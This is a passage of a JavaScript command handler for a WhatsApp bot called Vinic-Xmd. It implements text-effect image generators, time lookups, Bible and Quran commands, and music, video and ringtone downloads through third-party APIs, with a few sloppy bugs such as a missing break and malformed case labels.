      let responseMessage = `*Top 10 Results for "${text}":*\n\n`;

      for (let item of limitedResults) {
        responseMessage += `📱 *Name:* ${item.name}\n`;
        responseMessage += `📝 *Description:* ${item.description}\n`;
        responseMessage += `🌐 [View Image](${item.thumbnail})\n\n`;
      }

      reply(responseMessage);
    } catch (error) {
      console.error('Error fetching results from GSMArena API:', error);
      reply("❌ An error occurred while fetching results from GSMArena.");
    }
}
break
case "time": {
    try {
        let countryName = text.trim();
        
        if (!countryName) {
            // If no country provided, show current bot time
            const now = moment().tz(global.timezones || "Africa/Kampala");
            const timeInfo = `
⏰ *Current Bot Time* ⏰

🌍 *Timezone:* ${now.format('z (Z)')}
📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
🕒 *Time:* ${now.format('h:mm:ss A')}
📆 *Week Number:* ${now.format('WW')}
⏳ *Day of Year:* ${now.format('DDD')}

*Usage:* ${prefix}time [country name]
*Example:* ${prefix}time Japan
            `.trim();

            return await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });
        }

        // Get timezone for the country
        const timezones = moment.tz.zonesForCountry(countryName);
        
        if (!timezones || timezones.length === 0) {
            return reply(`❌ *Country not found!*\nPlease provide a valid country name.\n\nExample: ${prefix}time Japan`);
        }

        // Use the first timezone for that country
        const primaryTimezone = timezones[0];
        const now = moment().tz(primaryTimezone);
        
        const timeInfo = `
⏰ *Time in ${countryName.toUpperCase()}* ⏰

🌍 *Timezone:* ${primaryTimezone} (${now.format('Z')})
📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
🕒 *Time:* ${now.format('h:mm:ss A')}
🕛 *24-hour format:* ${now.format('HH:mm:ss')}
📆 *Week Number:* ${now.format('WW')}
⏳ *Day of Year:* ${now.format('DDD')}

*Other timezones in ${countryName}:* ${timezones.slice(0, 5).join(', ')}${timezones.length > 5 ? '...' : ''}
        `.trim();

        await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });

    } catch (error) {
        console.error('Error in time command:', error);
        reply('❌ *Unable to fetch time information.*\nPlease try a different country name or try again later.');
    }
    
}
break
case "dragonball": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}dragonball Kelvin*`);
    }

    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in dragonball command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "glossysilver": {
    try {
        if (!text) return reply('Please provide text. Example: .glossysilver Hello World');
        
        let query = text.trim();
        let res = await fetch(`https://api.giftedtech.co.ke/api/photooxy/glossy-silver?apikey=gifted&text=${encodeURIComponent(query)}`);
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        // Check if the response has the expected structure
        if (json && json.success && json.result && json.result.image_url) {
            await conn.sendMessage(m.chat, { 
                image: { url: json.result.image_url },
                caption: `✨ Glossy Silver Text: ${query}`
            }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error generating glossy silver text:', error);
        reply('Sorry, I couldn\'t generate the glossy silver text. Please try again later.');
    }
}
break
case 'arting': {
    if (!text) return reply('Provide text! Example: .arting girl wearing glasses');
    await conn.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
    
    try {
        await conn.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }}, { quoted: m });
    } catch (err) {
        console.log(err.message);
        conn.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
        reply('failed to create image!');
    }
}  
break   
case " advancedglow": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}advancedglow Kevin*`);
    }

    const link = "https://en.ephoto360.com/advanced-glow-effects-74.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in advancedglow command:", error);
      reply("*An error occurred while generating the effect.*");
      }
}
break
case "blackpinklogo": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinklogo Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinklogo command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "blackpinkstyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinkstyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinkstyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "cartoonstyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}cartoonstyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in cartoonstyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "deadpool": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}deadpool Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in deadpool command:", error);
      reply("*An error occurred while generating the effect.*");
    }
} 
break
case "effectclounds": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}effectclouds Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in effectclouds command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "flagtext": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}flagtext Kevin*`);
    }

    const link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in flagtext command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "freecreate": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}freecreate Kevin*`);
    }

    const link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in freecreate command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "galaxystyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}galaxystyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in galaxystyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "galaxywallpaper": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}galaxywallpaper Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in galaxywallpaper command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "makingneon": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}makingneon Kevin*`);
    }

    const link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in makingneon command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
case "matrix": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}matrix Kevin*`);
    }

    const link = "https://en.ephoto360.com/matrix-text-effect-154.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in matrix command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case"royaltext": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}royaltext Kevin*`);
    }

    const link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in royaltext command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "sand": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}sand Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in sand command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "summerbeach": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}summerbeach Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in summerbeach command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "topography": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}topography Tylor*`);
    }

    const link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in topography command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "typography": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}typography Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in typography command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "luxurygold": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}luxurygold Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in luxurygold command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "multicoloredneon": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}multicoloredneon Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in multicoloredneon command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "pixelglitch": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}pixelglitch Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `${mess.done}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in pixelglitch command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
//======[RELIGION MENU CMDS]==
break
case 'bible': {
const BASE_URL = "https://bible-api.com";

    try {
      let chapterInput = text.split(" ").join("").trim();
      if (!chapterInput) {
        throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} John 3:16*`);
      }
      chapterInput = encodeURIComponent(chapterInput);
      let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
      if (!chapterRes.ok) {
        throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} John 3:16*`);
      }
      
      let chapterData = await chapterRes.json();
      let bibleChapter = `
*The Holy Bible*\n
*Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
*Chapter Content:*\n
${chapterData.text}\n`;
      
      reply(bibleChapter);
    } catch (error) {
      reply(`Error: ${error.message}`);
    }
}
break
case "biblelist": {
try {
        // Liste des livres de la Bible
        const bibleList = `
📜 *Old Testament*:
1. Genesis
2. Exodus
3. Leviticus
4. Numbers
5. Deuteronomy
6. Joshua
7. Judges
8. Ruth
9. 1 Samuel
10. 2 Samuel
11. 1 Kings
12. 2 Kings
13. 1 Chronicles
14. 2 Chronicles
15. Ezra
16. Nehemiah
17. Esther
18. Job
19. Psalms
20. Proverbs
21. Ecclesiastes
22. Song of Solomon
23. Isaiah
24. Jeremiah
25. Lamentations
26. Ezekiel
27. Daniel
28. Hosea
29. Joel
30. Amos
31. Obadiah
32. Jonah
33. Micah
34. Nahum
35. Habakkuk
36. Zephaniah
37. Haggai
38. Zechariah
39. Malachi

📖 *New Testament*:
1. Matthew
2. Mark
3. Luke
4. John
5. Acts
6. Romans
7. 1 Corinthians
8. 2 Corinthians
9. Galatians
10. Ephesians
11. Philippians
12. Colossians
13. 1 Thessalonians
14. 2 Thessalonians
15. 1 Timothy
16. 2 Timothy
17. Titus
18. Philemon
19. Hebrews
20. James
21. 1 Peter
22. 2 Peter
23. 1 John
24. 2 John
25. 3 John
26. Jude
27. Revelation


💢 Vinic-Xmd 💢
`;

        // Remplacer ce lien par l'URL de l'image que tu m'enverras
        const imageUrl = "https://files.catbox.moe/ptpl5c.jpeg"; // Remplace "TON_LIEN_IMAGE_ICI" par ton lien d'image

        // Vérifier si le message de la commande est correctement reçu
        if (!m.chat) {
            return reply("❌ *An error occurred: Invalid chat.*");
        }

        // Envoi de la réponse avec l'image et la liste des livres de la Bible
        await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `📖 *BIBLE LIST Vinic-Xmd*:\n\n` +
                     `Here is the complete list of books in the Bible:\n\n` +
                     bibleList.trim() // Ajout du texte des livres de la Bible
        }, { quoted: mek });
    } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching the Bible list. Please try again.*");
    }
}
break
case "Quran": {
try {
      let surahInput = text.split(" ")[0];
      if (!surahInput) {
        throw new Error(`*Please specify the surah number or name*`);
      }
      
      let surahListRes = await fetch("https://quran-endpoint.vercel.app/quran");
      let surahList = await surahListRes.json();
      let surahData = surahList.data.find(
        (surah) =>
          surah.number === Number(surahInput) ||
          surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() ||
          surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
      );
      
      if (!surahData) {
        throw new Error(`Couldn't find surah with number or name "${surahInput}"`);
      }
      
      let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`);
      if (!res.ok) {
        let error = await res.json();
        throw new Error(`API request failed with status ${res.status} and message ${error.message}`);
      }

      let json = await res.json();
      let quranSurah = `
*Quran: The Holy Book*\n
*Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
*Explanation:*\n
${json.data.tafsir.id}`;
      
      reply(quranSurah);

      if (json.data.recitation.full) {
        await conn.sendMessage(
          m.chat,
          {
            audio: { url: json.data.recitation.full },
            mimetype: "audio/mp4",
            ptt: true,
            fileName: `recitation.mp3`,
          },
          { quoted: m }
        );
      }
    } catch (error) {
      reply(`Error: ${error.message}`);
    }
}
//===[DOWNLOAD MENU CMDS]===
break
case "play":
case "song": {
  if (!text) return reply(`*Example*: ${prefix + command} Wrong places by joshua baraka `);
  
  try {
    // Search for the song using Nekolabs API
    const searchResponse = await fetch(`https://api.nekolabs.my.id/api/music/search?q=${encodeURIComponent(text)}`);
    if (!searchResponse.ok) return res('Failed to search for music');
    
    const searchData = await searchResponse.json();
    if (!searchData.status || !searchData.result || searchData.result.length === 0) {
      return reply('No results found for your search');
    }
    
    const firstResult = searchData.result[0];
    
    // Send song info with thumbnail
    let body = `
━✦ 𝐓𝐢𝐭𝐥𝐞 : *${firstResult.title || 'Unknown'}*
━✦ 𝐀𝐫𝐭𝐢𝐬𝐭 : *${firstResult.artist || 'Unknown'}*
━✦ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 : *${firstResult.duration || 'Unknown'}*`;
    
    if (firstResult.thumbnail) {
      conn.sendMessage(m.chat, { 
        image: { url: firstResult.thumbnail }, 
        caption: body 
      }, { quoted: m });
    } else {
      conn.sendMessage(m.chat, { 
        text: body 
      }, { quoted: m });
    }
    
    // Get the MP3 download URL
    const playResponse = await fetch(`https://api.nekolabs.my.id/api/music/download?id=${firstResult.id}`);
    if (!playResponse.ok) return reply('Failed to get download URL');
    
    const playData = await playResponse.json();
    if (!playData.status || !playData.result || !playData.result.audio) {
      return res('Could not get audio download link');
    }
    
    const audioUrl = playData.result.audio;
    
    // Send the audio file
    await conn.sendMessage(m.chat, {
      audio: { url: audioUrl },
      mimetype: 'audio/mpeg',
      fileName: `${firstResult.title}.mp3`.replace(/[^\w\s.-]/gi, ''),
      ptt: false,
    }, { quoted: m });
    
  } catch (e) {
    console.error('Play command error:', e);
    res('An error occurred while processing your request');
  }
  
}
break
case "ringtone": {
try {
        const query = args.join(" ");
        if (!query) {
            return reply("Please provide a search query! Example: .ringtone Suna");
        }

        const { data } = await axios.get(`https://www.dark-yasiya-api.site/download/ringtone?text=${encodeURIComponent(query)}`);

        if (!data.status || !data.result || data.result.length === 0) {
            return reply("No ringtones found for your query. Please try a different keyword.");
        }

        const randomRingtone = data.result[Math.floor(Math.random() * data.result.length)];

        await conn.sendMessage(
            from,
            {
                audio: { url: randomRingtone.dl_link },
                mimetype: "audio/mpeg",
                fileName: `${randomRingtone.title}.mp3`,
            },
            { quoted: m }
        );
    } catch (error) {
        console.error("Error in ringtone command:", error);
        reply("Sorry, something went wrong while fetching the ringtone. Please try again later.");
    }
}
break
case " playdoc": {
if (!text) return reply('*Please provide a song name!*');

    try {
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0];
      const downloadUrl = await fetchMp3DownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        document: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${video.title}.mp3`
      }, { quoted: m });

    } catch (error) {
      console.error('playdoc command failed:', error);
      reply(`Error: ${error.message}`);
    }
}
break;
case "play2": {
try { 
        if (!q) return await reply("Please provide a YouTube URL or song name.");
        
        const yt = await ytsearch(q);
        if (yt.results.length < 1) return reply("No results found!");
        
        let yts = yt.results[0];  
        let apiUrl = `https://apis.davidcyriltech.my.id/youtube/mp3?url=${encodeURIComponent(yts.url)}`;
        
        let response = await fetch(apiUrl);
        let data = await response.json();
        
        if (data.status !== 200 || !data.success || !data.result.downloadUrl) {
            return reply("Failed to fetch the audio. Please try again later.");
        }
        
        let ytmsg = `🎵 *Song Details*
🎶 *Title:* ${yts.title}
⏳ *Duration:* ${yts.timestamp}
👀 *Views:* ${yts.views}
👤 *Author:* ${yts.author.name}
🔗 *Link:* ${yts.url}

*Choose download format:*
1. 📄 MP3 as Document
2. 🎧 MP3 as Audio (Play)
3. 🎙️ MP3 as Voice Note (PTT)

_Reply with 1, 2 or 3 to this message to download the format you prefer._`;
        
        let contextInfo = {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363401548261516@newsletter',
                newsletterName: 'Vinic-Xmd',
                serverMessageId: 143
            }
        };
        
        // Send thumbnail with caption only
  const songmsg = await conn.sendMessage(from, { image: { url: yts.thumbnail }, caption: ytmsg, contextInfo }, { quoted: mek });

  
     
                     conn.ev.on("messages.upsert", async (msgUpdate) => {
        

                const mp3msg = msgUpdate.messages[0];
                if (!mp3msg.message || !mp3msg.message.extendedTextMessage) return;

                const selectedOption = mp3msg.message.extendedTextMessage.text.trim();

                if (
                    mp3msg.message.extendedTextMessage.contextInfo &&
                    mp3msg.message.extendedTextMessage.contextInfo.stanzaId === songmsg.key.id
                ) {
                
                            
                   await conn.sendMessage(from, { react: { text: "⬇️", key: mp3msg.key } });

                    switch (selectedOption) {
case "1":   

      
      
   await conn.sendMessage(from, { document: { url: data.result.downloadUrl }, mimetype: "audio/mpeg", fileName: `${yts.title}.mp3`, contextInfo }, { quoted: mp3msg });   
      
      
break;
case "2":   
await conn.sendMessage(from, { audio: { url: data.result.downloadUrl }, mimetype: "audio/mpeg", contextInfo }, { quoted: mp3msg });
break;
case "3":   
await conn.sendMessage(from, { audio: { url: data.result.downloadUrl }, mimetype: "audio/mpeg", ptt: true, contextInfo }, { quoted: mp3msg });
break;


default:
                            await conn.sendMessage(
                                from,
                                {
                                    text: "*invalid selection please select between ( 1 or 2 or 3) 🔴*",
                                },
                                { quoted: mp3msg }
                            );
             }}});
           
    } catch (e) {
        console.log(e);
        reply("An error occurred. Please try again later.");
    }
}

break
case "song2": {
if (!text) return reply('*Please provide a song name!*');

    try {
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0];
      const downloadUrl = await fetchMp3DownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${video.title}.mp3`
      }, { quoted: m });

    } catch (error) {
      console.error('play command failed:', error);
      reply(`Error: ${error.message}`);
    }
}
break
case "video": {
try { 
        if (!q) return await reply("Please provide a YouTube URL or song name.");
        
        const yt = await ytsearch(q);
        if (yt.results.length < 1) return reply("No results found!");
        
        let yts = yt.results[0];  
        let apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(yts.url)}`;
        
        let response = await fetch(apiUrl);
        let data = await response.json();
        
        if (data.status !== 200 || !data.success || !data.result.download_url) {
            return reply("Failed to fetch the video. Please try again later.");
        }

        let ytmsg = `📹 *Video Details*
🎬 *Title:* ${yts.title}
⏳ *Duration:* ${yts.timestamp}
👀 *Views:* ${yts.views}
👤 *Author:* ${yts.author.name}
🔗 *Link:* ${yts.url}

*Choose download format:*
1. 📄 Document (no preview)
2. ▶️ Normal Video (with preview)

_Reply to this message with 1 or 2 to download._`;

        let contextInfo = {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363401548261516@newsletter',
                newsletterName: 'Vinic-Xmd ',
                serverMessageId: 143
            }
        };

        // Send thumbnail with options
        const videoMsg = await conn.sendMessage(from, { image: { url: yts.thumbnail }, caption: ytmsg, contextInfo }, { quoted: mek });

        conn.ev.on("messages.upsert", async (msgUpdate) => {
            const replyMsg = msgUpdate.messages[0];
            if (!replyMsg.message || !replyMsg.message.extendedTextMessage) return;

            const selected = replyMsg.message.extendedTextMessage.text.trim();

            if (
                replyMsg.message.extendedTextMessage.contextInfo &&
                replyMsg.message.extendedTextMessage.contextInfo.stanzaId === videoMsg.key.id
            ) {
                await conn.sendMessage(from, { react: { text: "⬇️", key: replyMsg.key } });

                switch (selected) {
                    case "1":
                        await conn.sendMessage(from, {
                            document: { url: data.result.download_url },
                            mimetype: "video/mp4",
                            fileName: `${yts.title}.mp4`,
                            contextInfo
                        }, { quoted: replyMsg });
                        break;

                    case "2":
                        await conn.sendMessage(from, {
                            video: { url: data.result.download_url },
                            mimetype: "video/mp4",
                            contextInfo
                        }, { quoted: replyMsg });
                        break;

                    default:
                        await conn.sendMessage(
                            from,
                            { text: "*Please Reply with ( 1 , 2 or 3) ❤️" },
                            { quoted: replyMsg }
                        );
                        break;
                }
            }
        });

    } catch (e) {
        console.log(e);
        reply("An error occurred. Please try again later.");
    }
}
break
case "video2": {
    if (!text) return reply('*Please provide a song name!*');

    try {
      const dlkey = '_0x5aff35,_0x1876stqr';
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0]; 
      const videoData = await fetchVideoDownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        video: { url: videoData.download_url },
        mimetype: 'video/mp4',
        fileName: `${videoData.title}.mp4`,
        caption: videoData.title
      }, { quoted: m });

    } catch (error) {
      console.error('video command failed:', error);
      reply(`Error: ${error.message}`);
    }
}
break
case "'ytmp4'": {
    try { 
        if (!q) return await reply("Please provide a YouTube URL or song name.");
        
        const yt = await ytsearch(q);
        if (yt.results.length < 1) return reply("No results found!");
        
        let yts = yt.results[0];  
        let apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(yts.url)}`;
        
        let response = await fetch(apiUrl);
        let data = await response.json();
        
        if (data.status !== 200 || !data.success || !data.result.download_url) {
            return reply("Failed to fetch the video. Please try again later.");
        }

        let ytmsg = `📹 *Video Details*
🎬 *Title:* ${yts.title}
⏳ *Duration:* ${yts.timestamp}
👀 *Views:* ${yts.views}
👤 *Author:* ${yts.author.name}
🔗 *Link:* ${yts.url}

*Choose download format:*
1. 📄 Document (no preview)
2. ▶️ Normal Video (with preview)

_Reply to this message with 1 or 2 to download._`;

        let contextInfo = {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363401548261516@newsletter',
                newsletterName: 'Vinic-Xmd',
                serverMessageId: 143
            }
        };

        // Send thumbnail with options
        const videoMsg = await conn.sendMessage(from, { image: { url: yts.thumbnail }, caption: ytmsg, contextInfo }, { quoted: mek });

        conn.ev.on("messages.upsert", async (msgUpdate) => {
            const replyMsg = msgUpdate.messages[0];
            if (!replyMsg.message || !replyMsg.message.extendedTextMessage) return;

            const selected = replyMsg.message.extendedTextMessage.text.trim();

            if (
                replyMsg.message.extendedTextMessage.contextInfo &&
                replyMsg.message.extendedTextMessage.contextInfo.stanzaId === videoMsg.key.id
            ) {
                await conn.sendMessage(from, { react: { text: "⬇️", key: replyMsg.key } });

                switch (selected) {
                    case "1":
                        await conn.sendMessage(from, {
                            document: { url: data.result.download_url },
                            mimetype: "video/mp4",
                            fileName: `${yts.title}.mp4`,
                            contextInfo
                        }, { quoted: replyMsg });
                        break;

                    case "2":
                        await conn.sendMessage(from, {
                            video: { url: data.result.download_url },
                            mimetype: "video/mp4",
                            contextInfo
                        }, { quoted: replyMsg });
                        break;

                    default:
                        await conn.sendMessage(
                            from,
                            { text: "*Please Reply with ( 1 , 2 or 3) ❤️" },
                            { quoted: replyMsg }
                        );
                        break;
                }
            }
        });

    } catch (e) {
        console.log(e);
        reply("An error occurred. Please try again later.");
    }
}
break
case "ytstalk": {
try {
    if (!q) {
      return reply("❌ Please provide a valid YouTube channel username or ID.");
    }

    await conn.sendMessage(from, {
      react: { text: "⏳", key: m.key }
    });

    const apiUrl = `https://delirius-apiofc.vercel.app/tools/ytstalk?channel=${encodeURIComponent(q)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.status || !data.data) {
      return reply("⚠️ Failed to fetch YouTube channel details. Ensure the username or ID is correct.");
    }

    const yt = data.data;
    const caption = `╭━━━〔 *YOUTUBE STALKER* 〕━━━⊷\n`
      + `┃👤 *Username:* ${yt.username}\n`
      + `┃📊 *Subscribers:* ${yt.subscriber_count}\n`
      + `┃🎥 *Videos:* ${yt.video_count}\n`
      + `┃🔗 *Channel Link:* (${yt.channel})\n`
      + `╰━━━⪼\n\n`
      + `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Vinic-Xmd`;

    await conn.sendMessage(from, {
      image: { url: yt.avatar },
      caption: caption
    }, { quoted: m });

  } catch (error) {
    console.error("Error:", error);
    reply("❌ An error occurred while processing your request. Please try again.");
  }
}
break
case "download": {
if (!text) return reply('Enter download URL');
    
    try {
      let res = await fetch(text, { method: 'GET', redirect: 'follow' });
      let contentType = res.headers.get('content-type');
      let buffer = await res.buffer();
      let extension = contentType.split('/')[1]; 
      let filename = res.headers.get('content-disposition')?.match(/filename="(.*)"/)?.[1] || `download-${Math.random().toString(36).slice(2, 10)}.${extension}`;

      let mimeType;
      switch (contentType) {
        case 'audio/mpeg':
          mimeType = 'audio/mpeg';
          break;
        case 'image/png':
          mimeType = 'image/png';
          break;
        case 'image/jpeg':
          mimeType = 'image/jpeg';
          break;
        case 'application/pdf':
          mimeType = 'application/pdf';
          break;
        case 'application/zip':
          mimeType = 'application/zip';
          break;
        case 'video/mp4':
          mimeType = 'video/mp4';
          break;
        case 'video/webm':
